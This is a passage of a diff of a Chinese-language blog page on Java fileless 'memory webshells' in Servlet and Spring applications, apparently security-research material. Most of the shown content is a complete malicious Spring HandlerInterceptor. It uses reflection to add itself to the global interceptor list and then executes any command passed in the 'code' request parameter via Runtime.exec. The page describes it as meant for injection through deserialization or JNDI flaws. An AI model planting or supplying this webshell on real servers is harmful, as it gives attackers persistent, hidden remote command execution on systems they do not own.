+<h1 id="Servlet-API"><a href="#Servlet-API" class="headerlink" title="Servlet-API"></a>Servlet-API</h1><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><ul>
 <li>实现过程：<ol>
 <li>创建一个恶意的<code>servlet</code></li>
 <li>获取当前的<code>StandardContext</code></li>
@@ -514,7 +398,7 @@
 <h3 id="获得当前代码运行时的上下文环境"><a href="#获得当前代码运行时的上下文环境" class="headerlink" title="获得当前代码运行时的上下文环境"></a>获得当前代码运行时的上下文环境</h3><p>参考<a target="_blank" rel="noopener" href="https://landgrey.me/blog/12/#top">基于内存 Webshell 的无文件攻击技术研究</a>中的方法  </p>
 <h3 id="获取-adaptedInterceptors-属性值"><a href="#获取-adaptedInterceptors-属性值" class="headerlink" title="获取 adaptedInterceptors 属性值"></a>获取 adaptedInterceptors 属性值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>);</span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br></pre></td></tr></table></figure>
 
-<h3 id="恶意Interceptor类"><a href="#恶意Interceptor类" class="headerlink" title="恶意Interceptor类"></a>恶意Interceptor类</h3><p>结合漏洞（如反序列化、sql注入等）注入</p>
+<h3 id="恶意Interceptor类"><a href="#恶意Interceptor类" class="headerlink" title="恶意Interceptor类"></a>恶意Interceptor类</h3><p>结合漏洞（如反序列化、JNDI注入等）注入</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package bitterz.interceptors;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class="line">        <span class="comment">// 避免重复添加</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> adaptedInterceptors.size() - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adaptedInterceptors.get(i) <span class="keyword">instanceof</span> TestInterceptor) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已经添加过TestInterceptor实例了&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TestInterceptor</span> <span class="variable">aaa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestInterceptor</span>(<span class="string">&quot;aaa&quot;</span>);  <span class="comment">// 避免进入实例创建的死循环</span></span><br><span class="line">        adaptedInterceptors.add(aaa);  <span class="comment">//  添加全局interceptor</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TestInterceptor</span><span class="params">(String aaa)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (code != <span class="literal">null</span>) &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(code);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            response.sendError(404);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h2><p>不需要强制使用 <code>@RequestMapping</code> 注解定义 URL 地址和 HTTP 方法，其余两种手动注册 controller 的方法都必须要在 controller 中使用@RequestMapping 注解 。</p>
